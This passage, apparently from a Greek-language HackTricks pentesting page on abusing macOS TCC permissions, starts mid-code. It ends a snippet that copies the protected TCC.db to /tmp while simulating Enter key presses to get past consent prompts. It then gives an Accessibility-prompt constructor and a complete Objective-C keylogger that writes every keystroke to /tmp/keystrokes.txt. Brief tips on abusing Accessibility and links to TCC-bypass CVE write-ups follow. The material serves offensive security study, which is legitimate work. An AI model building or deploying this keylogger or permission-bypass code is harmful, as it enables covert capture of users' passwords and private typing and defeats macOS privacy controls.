"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
"set targetFolder to POSIX file \"/tmp\" as alias\n"
"duplicate file sourceFile to targetFolder with replacing\n"
"end tell\n";

NSDictionary *errorDict = nil;
NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
[appleScript executeAndReturnError:&errorDict];

if (errorDict) {
NSLog(@"AppleScript Error: %@", errorDict);
}
}

int main() {
@autoreleasepool {
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
RunAppleScript();
});

// Simulate pressing the Enter key every 0.1 seconds
NSLog(@"Starting key presses");
for (int i = 0; i < 10; ++i) {
SimulateKeyPress((CGKeyCode)36); // Key code for Enter
usleep(100000); // 0.1 seconds
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="Check / Prompt"}}
Ελέγξτε αν η τρέχουσα διεργασία είναι ήδη έμπιστη για το Accessibility και ζητήστε από το macOS να εμφανίσει το UI συγκατάθεσης, αν δεν είναι.
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
__attribute__((constructor))
static void axprompt(int argc, const char **argv) {
NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
}
```
{{#endtab}}

{{#tab name="Keylogger"}}
Αποθήκευση των πατημένων πλήκτρων στο **`/tmp/keystrokes.txt`**
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

// clang -framework Foundation -framework ApplicationServices -framework Carbon -o KeyboardMonitor KeyboardMonitor.m

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
if (fileHandle) {
[fileHandle seekToEndOfFile];
[fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
[fileHandle closeFile];
} else {
// If the file does not exist, create it
[str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
}
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
if (type == kCGEventKeyDown) {
CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

NSString *keyString = nil;
// First, handle special non-printable keys
switch (keyCode) {
case kVK_Return: keyString = @"<Return>"; break;
case kVK_Tab: keyString = @"<Tab>"; break;
case kVK_Space: keyString = @"<Space>"; break;
case kVK_Delete: keyString = @"<Delete>"; break;
case kVK_Escape: keyString = @"<Escape>"; break;
case kVK_Command: keyString = @"<Command>"; break;
case kVK_Shift: keyString = @"<Shift>"; break;
case kVK_CapsLock: keyString = @"<CapsLock>"; break;
case kVK_Option: keyString = @"<Option>"; break;
case kVK_Control: keyString = @"<Control>"; break;
case kVK_RightControl: keyString = @"<Control>"; break;
case kVK_RightShift: keyString = @"<Shift>"; break;
case kVK_RightOption: keyString = @"<Option>"; break;
case kVK_Function: keyString = @"<Function>"; break;
case kVK_F1: keyString = @"<F1>"; break;
case kVK_F2: keyString = @"<F2>"; break;
case kVK_F3: keyString = @"<F3>"; break;
// Add more cases here for other non-printable keys...
default: break; // Not a special non-printable key
}

// If it's not a special key, try to translate it
if (!keyString) {
UniCharCount maxStringLength = 4;
UniCharCount actualStringLength = 0;
UniChar unicodeString[maxStringLength];

TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

UInt32 deadKeyState = 0;
OSStatus status = UCKeyTranslate(keyboardLayout,
keyCode,
kUCKeyActionDown,
0,
LMGetKbdType(),
kUCKeyTranslateNoDeadKeysBit,
&deadKeyState,
maxStringLength,
&actualStringLength,
unicodeString);
CFRelease(currentKeyboard);

if (status == noErr && actualStringLength > 0) {
keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
} else {
keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
}
}

NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
AppendStringToFile(logString, kKeystrokesLogPath);
}
return event;
}

int main() {
@autoreleasepool {
CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);

if (!eventTap) {
NSLog(@"Failed to create event tap");
exit(1);
}

CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
CGEventTapEnable(eventTap, true);
CFRunLoopRun();
}
return 0;
}
```
{{#endtab}}
{{#endtabs}}

> [!CAUTION] > **Η Accessibility είναι ένα πολύ ισχυρό permission**, θα μπορούσατε να την καταχραστείτε και με άλλους τρόπους· για παράδειγμα, θα μπορούσατε να εκτελέσετε το **keystrokes attack** μόνο μέσω αυτής, χωρίς να χρειάζεται να καλέσετε το System Events.

> [!TIP]
> Οι νεότερες εκδόσεις του macOS διαχωρίζουν επίσης την κατάχρηση της desktop-session μεταξύ του **Input Monitoring** (`kTCCServiceListenEvent`) και του **synthetic input** (`kTCCServicePostEvent`). Αν χρειάζεστε keylogging, screen grabs ή raw event injection αντί για αυτοματοποίηση μέσω AXUIElement, ελέγξτε το [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).

## References

- [1] [Cisco Talos - Πώς πολλαπλές ευπάθειες σε εφαρμογές της Microsoft για macOS ανοίγουν τον δρόμο για την κλοπή permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
- [2] [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
- [3] [Apple Developer - Αίτημα authorization για media capture στο macOS](https://developer.apple.com/documentation/bundleresources/requesting-authorization-for-media-capture-on-macos?language=objc)
- [4] [Apple Developer - Capture HDR content with ScreenCaptureKit (WWDC24)](https://developer.apple.com/videos/play/wwdc2024/10088/)
- [5] [vsociety - CVE-2023-26818: MacOS TCC Bypass με το Telegram μέσω DyLib Injection Part1](https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4)
- [6] [Vicarius vsociety - CVE-2023-26818: Exploit macOS TCC Bypass w/ Telegram (Part 1)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2)
- [7] [Apple Developer - Καταγραφή system audio με Core Audio taps](https://developer.apple.com/documentation/coreaudio/capturing-system-audio-with-core-audio-taps)
- [8] [catap - Python bindings και recorder για Core Audio process taps](https://github.com/sbetko/catap)
{{#include ../../../../banners/hacktricks-training.md}}
